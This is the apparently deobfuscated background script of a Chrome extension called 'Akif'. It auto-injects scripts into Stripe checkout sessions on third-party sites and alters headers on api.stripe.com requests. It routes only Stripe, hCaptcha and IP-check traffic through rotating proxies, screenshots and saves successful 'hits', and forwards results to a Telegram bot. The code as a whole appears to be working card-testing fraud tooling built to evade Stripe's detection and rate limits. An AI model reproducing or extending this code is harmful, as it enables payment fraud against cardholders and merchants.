async function registerServiceWorker() {
  try {
    await chrome.declarativeNetRequest.updateDynamicRules({
      'removeRuleIds': [1],
      'addRules': [{
        'id': 0x1,
        'priority': 0x1,
        'action': {
          'type': "modifyHeaders",
          'requestHeaders': [{
            'header': "content-type",
            'operation': "set",
            'value': "application/x-www-form-urlencoded"
          }]
        },
        'condition': {
          'urlFilter': "||api.stripe.com/",
          'resourceTypes': ["xmlhttprequest"]
        }
      }]
    });
  } catch (v_1) {}
}
chrome.runtime.onStartup.addListener(async () => {
  await registerServiceWorker(), setupKeepAlive();
}), chrome.runtime.onInstalled.addListener(async p_1 => {
  await registerServiceWorker(), setupKeepAlive();
  if (p_1 && p_1.reason === "install") {
    try {
      await chrome.tabs.create({
        'url': chrome.runtime.getURL("welcome.html")
      });
    } catch (v_1) {}
  }
});
const ALARM_NAME = "akif-keepalive";
function setupKeepAlive() {
  const v_1 = {};
  v_1.periodInMinutes = 0.33;
  chrome.alarms.create(ALARM_NAME, v_1);
}
chrome.alarms.onAlarm.addListener(p_1 => {
  p_1.name === ALARM_NAME && chrome.runtime.getPlatformInfo(() => {});
}), setInterval(() => {
  chrome.runtime.getPlatformInfo(() => {});
}, 20000), setupKeepAlive();
const STRIPE_SESSION_RE = /cs_(live|test)_[A-Za-z0-9]{8,}/,
  injectedFrames = new Set();
function isStripeHostedCheckout(p_1) {
  return /^https?:\/\/([^/]+\.)?checkout\.stripe\.com\//.test(p_1 || '');
}
function looksLikeStripeCheckout(p_1) {
  if (!p_1) return false;
  if (isStripeHostedCheckout(p_1)) return false;
  if (!STRIPE_SESSION_RE.test(p_1)) return false;
  return /^https?:\/\//.test(p_1);
}
async function autoInjectStripe(p_1, p_2, p_3) {
  if (!looksLikeStripeCheckout(p_3)) return;
  const v_1 = p_1 + ':' + p_2 + ':' + p_3;
  if (injectedFrames.has(v_1)) return;
  injectedFrames.add(v_1);
  try {
    const v_1_1 = {};
    v_1_1.tabId = p_1, v_1_1.frameIds = [p_2], await chrome.scripting.insertCSS({
      'target': v_1_1,
      'files': ["styles.css"]
    });
  } catch (v_1_1) {}
  try {
    const v_1_1 = {};
    v_1_1.tabId = p_1, v_1_1.frameIds = [p_2], await chrome.scripting.executeScript({
      'target': v_1_1,
      'files': ["script/content.js"]
    });
  } catch (v_1_1) {}
}
chrome.webNavigation && chrome.webNavigation.onCommitted && (chrome.webNavigation.onCommitted.addListener(p_1 => {
  autoInjectStripe(p_1.tabId, p_1.frameId, p_1.url);
}), chrome.webNavigation.onHistoryStateUpdated.addListener(p_1 => {
  autoInjectStripe(p_1.tabId, p_1.frameId, p_1.url);
}));
chrome.tabs.onRemoved.addListener(p_1 => {
  Array.from(injectedFrames).forEach(p_1_1 => {
    if (p_1_1.startsWith(p_1 + ':')) injectedFrames.delete(p_1_1);
  });
});
const ports = new Set();
chrome.runtime.onConnect.addListener(p_1 => {
  ports.add(p_1), registerServiceWorker();
  p_1.onDisconnect.addListener(() => {
    ports.delete(p_1);
  });
  const v_1 = setInterval(() => {
    try {
      p_1.postMessage({
        'type': "PING"
      });
    } catch (v_1_1) {
      clearInterval(v_1);
    }
  }, 25000);
});
let offscreenCreated = false;
async function ensureOffscreenDocument() {
  if (offscreenCreated) {
    return true;
  }
  try {
    const v_1 = await chrome.runtime.getContexts({
      'contextTypes': ["OFFSCREEN_DOCUMENT"]
    });
    if (v_1.length > 0) return offscreenCreated = true, true;
    return await chrome.offscreen.createDocument({
      'url': "offscreen.html",
      'reasons': ["AUDIO_PLAYBACK"],
      'justification': "Play success sound notification"
    }), offscreenCreated = true, true;
  } catch (v_1) {
    if (v_1.message?.["includes"]("already exists")) return offscreenCreated = true, true;
    return false;
  }
}
const capturedHits = new Map();
async function captureScreenshot(p_1) {
  try {
    let v_1 = await chrome.storage.local.get(["akif_toggle_auto_ss"]).catch(() => null);
    if (!v_1) return null;
    if (v_1.akif_toggle_auto_ss === false) return null;
    let v_2 = capturedHits.get(p_1),
      v_3 = Date.now();
    if (v_2 && v_3 - v_2 < 5000) return null;
    capturedHits.set(p_1, v_3), setTimeout(() => capturedHits.delete(p_1), 10000), await new Promise(p_1_1 => setTimeout(p_1_1, 500));
    let v_4;
    if (p_1) v_4 = await chrome.tabs.get(p_1);else {
      const v_1_1 = {};
      v_1_1.active = true, v_1_1.currentWindow = true;
      const [v_2_1] = await chrome.tabs.query(v_1_1);
      v_4 = v_2_1;
    }
    if (!v_4 || !v_4.windowId) throw new Error("Invalid tab or window");
    const v_5 = {};
    v_5.focused = true, await chrome.windows.update(v_4.windowId, v_5);
    const v_6 = {};
    v_6.active = true, await chrome.tabs.update(v_4.id, v_6), await new Promise(p_1_1 => setTimeout(p_1_1, 100));
    let v_7 = await chrome.tabs.captureVisibleTab(v_4.windowId, {
      'format': "png",
      'quality': 0x64
    });
    if (!v_7) return null;
    await ensureOffscreenDocument(), await chrome.runtime.sendMessage({
      'type': "COPY_TO_CLIPBOARD",
      'dataUrl': v_7
    }).catch(() => {});
    let v_8 = new Date().toISOString().replace(/[:.]/g, '-');
    return await chrome.downloads.download({
      'url': v_7,
      'filename': "Akif_@AkifUpdate_" + v_8 + ".png",
      'saveAs': false
    }), v_7;
  } catch (v_1) {
    return null;
  }
}
let globalProxyList = [];
let proxyRotationIndex = 0;
function loadGlobalProxyList() {
  try {
    chrome.storage.local.get(["akif_proxy_list_global"], p_1 => {
      if (chrome.runtime.lastError) {
        globalProxyList = [];
        return;
      }
      p_1 && p_1.akif_proxy_list_global && Array.isArray(p_1.akif_proxy_list_global) ? globalProxyList = p_1.akif_proxy_list_global.filter(p_1_1 => p_1_1.status === "working") : globalProxyList = [];
    });
  } catch (v_1) {
    globalProxyList = [];
  }
}
function getRandomWorkingProxy() {
  if (globalProxyList.length === 0) return null;
  const v_3 = Math.floor(Math.random() * globalProxyList.length);
  return globalProxyList[v_3].proxy;
}
function pickNextRotatingProxy() {
  if (!globalProxyList.length) return null;
  const v_3 = globalProxyList[proxyRotationIndex % globalProxyList.length];
  return proxyRotationIndex = (proxyRotationIndex + 1) % Math.max(1, globalProxyList.length), v_3 && v_3.proxy ? v_3.proxy : null;
}
let proxyFetchQueue = Promise.resolve();
function enqueueProxyFetch(p_1) {
  const fn_1 = () => p_1();
  return proxyFetchQueue = proxyFetchQueue.then(fn_1, fn_1), proxyFetchQueue;
}
let activeProxyCreds = null;
function parseProxyString(p_1) {
  if (!p_1 || typeof p_1 !== "string") return null;
  let v_1 = p_1.trim();
  let v_2 = "http";
  const v_3 = v_1.match(/^(socks5|socks4|http|https):\/\//i);
  if (v_3) {
    v_2 = v_3[1].toLowerCase(), v_1 = v_1.slice(v_3[0].length);
  }
  let v_4 = '',
    v_5 = '';
  if (v_1.includes('@')) {
    const v_1_1 = v_1.lastIndexOf('@'),
      v_2_1 = v_1.slice(0, v_1_1);
    v_1 = v_1.slice(v_1_1 + 1);
    const v_3_1 = v_2_1.indexOf(':');
    if (v_3_1 >= 0) {
      v_4 = v_2_1.slice(0, v_3_1), v_5 = v_2_1.slice(v_3_1 + 1);
    } else v_4 = v_2_1;
  }
  const v_6 = v_1.split(':'),
    v_7 = v_6[0] || '',
    v_8 = parseInt(v_6[1], 10);
  if (!v_4 && v_6.length >= 4) {
    v_4 = v_6[2], v_5 = v_6.slice(3).join(':');
  }
  if (!v_7 || !v_8 || isNaN(v_8) || v_8 < 1 || v_8 > 65535) return null;
  if ((v_2 === "socks5" || v_2 === "socks4") && v_4) {
    v_2 = "http";
  }
  const v_9 = {};
  return v_9.scheme = v_2, v_9.host = v_7, v_9.port = v_8, v_9.username = v_4, v_9.password = v_5, v_9.raw = p_1, v_9;
}
function buildPacScript(p_1) {
  const v_1 = p_1.scheme === "socks5" ? "SOCKS5" : p_1.scheme === "socks4" ? "SOCKS4" : p_1.scheme === "https" ? "HTTPS" : "PROXY",
    v_2 = p_1.host + ':' + p_1.port;
  return "function FindProxyForURL(url, host) {\n  host = host.toLowerCase();\n" + "  if (host === \"stripe.com\" || dnsDomainIs(host, \".stripe.com\") ||\n" + "      host === \"stripe.network\" || dnsDomainIs(host, \".stripe.network\") ||\n" + "      host === \"stripecdn.com\" || dnsDomainIs(host, \".stripecdn.com\") ||\n" + "      host === \"link.com\" || dnsDomainIs(host, \".link.com\") ||\n" + "      host === \"hcaptcha.com\" || dnsDomainIs(host, \".hcaptcha.com\") ||\n" + "      host === \"api.ipify.org\" || host === \"ipinfo.io\" || host === \"ifconfig.me\") {\n" + "    return \"" + v_1 + '\x20' + v_2 + "\";\n" + "  }\n" + "  return \"DIRECT\";\n" + '}';
}
function applyActiveProxy(p_1) {
  return new Promise((p_1_1, p_2) => {
    const v_1 = buildPacScript(p_1);
    const v_2 = {};
    v_2.data = v_1, v_2.mandatory = false, chrome.proxy.settings.set({
      'value': {
        'mode': "pac_script",
        'pacScript': v_2
      },
      'scope': "regular"
    }, () => {
      if (chrome.runtime.lastError) p_2(new Error(chrome.runtime.lastError.message));else {
        activeProxyCreds = p_1, p_1_1(true);
      }
    });
  });
}
function clearActiveProxy() {
  return new Promise(p_1 => {
    chrome.proxy.settings.clear({
      'scope': "regular"
    }, () => {
      activeProxyCreds = null, p_1(true);
    });
  });
}
chrome.webRequest.onAuthRequired.addListener(p_1 => {
  if (p_1.isProxy && activeProxyCreds && activeProxyCreds.username) {
    const v_1 = {};
    v_1.username = activeProxyCreds.username, v_1.password = activeProxyCreds.password;
    const v_2 = {};
    return v_2.authCredentials = v_1, v_2;
  }
  return {};
}, {
  'urls': ["<all_urls>"]
}, ["blocking"]);
try {
  chrome.storage.local.get(["akif_active_proxy"], p_1 => {
    if (chrome.runtime.lastError) return;
    if (p_1 && p_1.akif_active_proxy) {
      const v_1 = parseProxyString(p_1.akif_active_proxy);
      v_1 && applyActiveProxy(v_1).catch(() => {});
    }
  });
} catch (v_1) {}
chrome.runtime.onMessage.addListener((p_1, p_2, p_3) => {
  if (p_1.type === "TELEGRAM_SEND") return (async () => {
    try {
      const v_1 = await fetch("https://api.telegram.org/bot" + p_1.botToken + "/sendMessage", {
          'method': "POST",
          'headers': {
            'Content-Type': "application/json"
          },
          'body': JSON.stringify({
            'chat_id': p_1.chatId,
            'text': p_1.text,
            'parse_mode': "HTML",
            'disable_web_page_preview': p_1.disablePreview || false
          })
        }),
        v_2 = await v_1.json();
      p_3(v_2);
    } catch (v_1) {
      const v_2 = {};
      v_2.ok = false, v_2.description = v_1.message, p_3(v_2);
    }
  })(), true;
  if (p_1.type === "FETCH_IMAGE") return (async () => {
    try {
      const v_1 = await fetch(p_1.url);
      if (!v_1.ok) {
        const v_1_1 = {};
        v_1_1.success = false, p_3(v_1_1);
        return;
      }
      const v_2 = await v_1.blob(),
        v_3 = new FileReader();
      v_3.onloadend = () => {
        const v_1_1 = {};
        v_1_1.success = true, v_1_1.dataUrl = v_3.result;
        p_3(v_1_1);
      };
      const v_4 = {};
      v_4.success = false, v_3.onerror = () => p_3(v_4), v_3.readAsDataURL(v_2);
    } catch (v_1) {
      const v_2 = {};
      v_2.success = false, v_2.error = v_1.message, p_3(v_2);
    }
  })(), true;
  if (p_1.type === "PLAY_SUCCESS_SOUND_OFFSCREEN") {
    return ensureOffscreenDocument().then(p_1_1 => {
      p_1_1 && setTimeout(() => {
        chrome.runtime.sendMessage({
          'type': "PLAY_SUCCESS_SOUND",
          'volume': p_1.volume || 1
        }).catch(() => {});
      }, 100);
    }), false;
  }
  if (p_1.type === "PLAY_CUSTOM_PREVIEW") {
    return chrome.storage.local.get(["akif_music_data"], p_1_1 => {
      if (chrome.runtime.lastError || !p_1_1) return;
      const v_1 = p_1_1.akif_music_data;
      if (v_1) {
        ensureOffscreenDocument().then(p_1_2 => {
          if (p_1_2) {
            setTimeout(() => {
              chrome.runtime.sendMessage({
                'type': "PLAY_CUSTOM_PREVIEW",
                'audioData': v_1
              }).catch(() => {});
            }, 100);
          }
        });
      }
    }), false;
  }
  if (p_1.type === "STOP_CUSTOM_PREVIEW") {
    return ensureOffscreenDocument().then(p_1_1 => {
      p_1_1 && chrome.runtime.sendMessage({
        'type': "STOP_CUSTOM_PREVIEW"
      }).catch(() => {});
    }), false;
  }
  if (p_1.type === "PLAY_BACKGROUND_MUSIC") return chrome.storage.local.get(["akif_music_data"], p_1_1 => {
    if (chrome.runtime.lastError || !p_1_1) return;
    const v_1 = p_1_1.akif_music_data;
    v_1 && ensureOffscreenDocument().then(p_1_2 => {
      p_1_2 && setTimeout(() => {
        chrome.runtime.sendMessage({
          'type': "PLAY_BACKGROUND_MUSIC",
          'audioData': v_1,
          'volume': p_1.volume
        }).catch(() => {});
      }, 100);
    });
  }), false;
  if (p_1.type === "STOP_BACKGROUND_MUSIC") return ensureOffscreenDocument().then(p_1_1 => {
    p_1_1 && chrome.runtime.sendMessage({
      'type': "STOP_BACKGROUND_MUSIC"
    }).catch(() => {});
  }), false;
  if (p_1.type === "CAPTURE_SCREENSHOT") {
    const v_1 = p_2 && p_2.tab ? p_2.tab.id : null;
    return captureScreenshot(v_1).then(p_1_1 => {
      const v_1_1 = {};
      v_1_1.dataUrl = p_1_1, p_3(v_1_1);
    }), true;
  }
  if (p_1.type === "BACKGROUND_FETCH") {
    const v_1 = {
      'method': p_1.method || "GET",
      'headers': p_1.headers || {}
    };
    return p_1.body && (v_1.body = p_1.body), fetch(p_1.url, v_1).then(async p_1_1 => {
      const v_1_1 = p_1_1.headers.get("content-type") || '';
      let v_2;
      if (v_1_1.includes("application/json")) {
        v_2 = await p_1_1.json();
      } else v_2 = await p_1_1.text();
      const v_3 = {};
      v_3.success = p_1_1.ok, v_3.status = p_1_1.status, v_3.data = v_2;
      p_3(v_3);
    }).catch(p_1_1 => {
      const v_1_1 = {};
      v_1_1.success = false, v_1_1.error = p_1_1.message, v_1_1.data = null, p_3(v_1_1);
    }), true;
  }
  if (p_1.type === "AKIF_HIT_SEND") {
    const v_1 = {};
    v_1.disabled = true;
    const v_2 = {};
    return v_2.success = true, v_2.result = v_1, p_3(v_2), true;
  }
  if (p_1.type === "TELEGRAM_SEND_DIRECT") return fetch("https://api.telegram.org/bot" + p_1.botToken + "/sendMessage", {
    'method': "POST",
    'headers': {
      'Content-Type': "application/json"
    },
    'body': JSON.stringify({
      'chat_id': p_1.chatId,
      'text': p_1.text,
      'parse_mode': "HTML",
      'disable_web_page_preview': true
    })
  }).then(p_1_1 => p_1_1.json()).then(p_1_1 => p_3(p_1_1)).catch(p_1_1 => p_3({
    'ok': false,
    'error': p_1_1.message
  })), true;
  if (p_1.type === "AKIF_PROXY_TEST") {
    return (async () => {
      const v_1 = (p_1.proxy || '').replace(/^(socks5|socks4|socks|http|https):\/\//i, '').trim(),
        v_2 = (p_1.proxy || '').match(/^(socks5|socks4|socks|http|https):\/\//i),
        v_3 = v_2 ? v_2[1].toLowerCase() : "http";
      const v_4 = v_1.split(':'),
        v_5 = v_4[0] || '';
      const v_6 = v_4[1] || '',
        v_7 = parseInt(v_6, 10);
      if (!v_5 || !v_6 || isNaN(v_7) || v_7 < 1 || v_7 > 65535) {
        p_3({
          'success': false,
          'error': "Invalid format",
          'message': "Invalid proxy (expected ip:port[:user:pass])"
        });
        return;
      }
      const v_8 = Date.now(),
        v_9 = new AbortController(),
        v_10 = setTimeout(() => v_9.abort(), 5000);
      let v_11 = false;
      try {
        await fetch("http://" + v_5 + ':' + v_7, {
          'method': "GET",
          'mode': "no-cors",
          'signal': v_9.signal,
          'cache': "no-store"
        }), v_11 = true;
      } catch (v_1_1) {
        v_1_1.name !== "AbortError" && (v_11 = true);
      } finally {
        clearTimeout(v_10);
      }
      const v_12 = Date.now() - v_8;
      if (v_11) {
        const v_1_1 = {};
        v_1_1.success = true, v_1_1.ip = v_5, v_1_1.latency = v_12, v_1_1.proxy_type = v_3, p_3(v_1_1);
      } else p_3({
        'success': false,
        'error': "Timeout",
        'message': "Connection timeout"
      });
    })(), true;
  }
  if (p_1.type === "UPDATE_GLOBAL_PROXY_LIST") {
    if (p_1.proxies && Array.isArray(p_1.proxies)) {
      globalProxyList = p_1.proxies.filter(p_1_1 => p_1_1.status === "working");
      const v_1 = {};
      v_1.akif_proxy_list_global = p_1.proxies, chrome.storage.local.set(v_1);
      const v_2 = {};
      v_2.success = true, p_3(v_2);
    } else {
      const v_1 = {};
      v_1.success = false, p_3(v_1);
    }
    return true;
  }
  if (p_1.type === "PROXY_FETCH") {
    return enqueueProxyFetch(async () => {
      try {
        if (globalProxyList.length > 0) {
          const v_1_1 = pickNextRotatingProxy(),
            v_2_1 = v_1_1 ? parseProxyString(v_1_1) : null;
          if (v_2_1) try {
            await applyActiveProxy(v_2_1), await new Promise(p_1_1 => setTimeout(p_1_1, 60));
          } catch (v_1_2) {}
        }
        const v_1 = new AbortController(),
          v_2 = setTimeout(() => v_1.abort(), 30000),
          v_3 = p_1.headers && typeof p_1.headers === "object" ? p_1.headers : {},
          v_4 = await fetch(p_1.url, {
            'method': p_1.method || "GET",
            'headers': v_3,
            'body': p_1.body || null,
            'signal': v_1.signal,
            'credentials': "include",
            'cache': "no-store",
            'redirect': "follow"
          });
        clearTimeout(v_2);
        const v_5 = v_4.headers.get("content-type") || '';
        let v_6;
        if (v_5.includes("application/json")) {
          v_6 = await v_4.json();
        } else v_6 = await v_4.text();
        const v_7 = {};
        v_7.success = v_4.ok, v_7.status = v_4.status, v_7.data = v_6, v_7.usedProxy = activeProxyCreds ? activeProxyCreds.raw : null, p_3(v_7);
      } catch (v_1) {
        const v_2 = {};
        v_2.success = false, v_2.error = v_1.message, v_2.usedProxy = activeProxyCreds ? activeProxyCreds.raw : null, p_3(v_2);
      }
    }), true;
  }
  if (p_1.type === "SET_ACTIVE_PROXY") {
    const v_1 = parseProxyString(p_1.proxy);
    if (!v_1) {
      return p_3({
        'success': false,
        'error': "Invalid proxy format"
      }), true;
    }
    return applyActiveProxy(v_1).then(() => {
      const v_1_1 = {};
      v_1_1.akif_active_proxy = p_1.proxy, chrome.storage.local.set(v_1_1);
      const v_2 = {};
      v_2.success = true;
      p_3(v_2);
    }).catch(p_1_1 => p_3({
      'success': false,
      'error': p_1_1.message
    })), true;
  }
  if (p_1.type === "CLEAR_ACTIVE_PROXY") {
    return clearActiveProxy().then(() => {
      chrome.storage.local.remove(["akif_active_proxy"]);
      const v_1 = {};
      v_1.success = true;
      p_3(v_1);
    }), true;
  }
  if (p_1.type === "GET_ACTIVE_PROXY") {
    const v_1 = {};
    return v_1.active = activeProxyCreds ? activeProxyCreds.raw : null, p_3(v_1), true;
  }
  if (p_1.type === "AKIF_GET_CURRENT_IP") {
    return (async () => {
      const v_1 = new AbortController();
      const v_2 = setTimeout(() => v_1.abort(), 8000);
      try {
        const v_1_1 = await fetch("https://api.ipify.org?format=json", {
          'method': "GET",
          'cache': "no-store",
          'credentials': "omit",
          'signal': v_1.signal
        });
        clearTimeout(v_2);
        const v_2_1 = await v_1_1.json(),
          v_3 = {};
        v_3.success = true, v_3.ip = v_2_1 && v_2_1.ip ? v_2_1.ip : null, v_3.viaProxy = !!activeProxyCreds, v_3.proxy = activeProxyCreds ? activeProxyCreds.raw : null, p_3(v_3);
      } catch (v_1_1) {
        clearTimeout(v_2), p_3({
          'success': false,
          'error': v_1_1.name === "AbortError" ? "Timeout" : v_1_1.message,
          'viaProxy': !!activeProxyCreds,
          'proxy': activeProxyCreds ? activeProxyCreds.raw : null
        });
      }
    })(), true;
  }
  return false;
}), loadGlobalProxyList();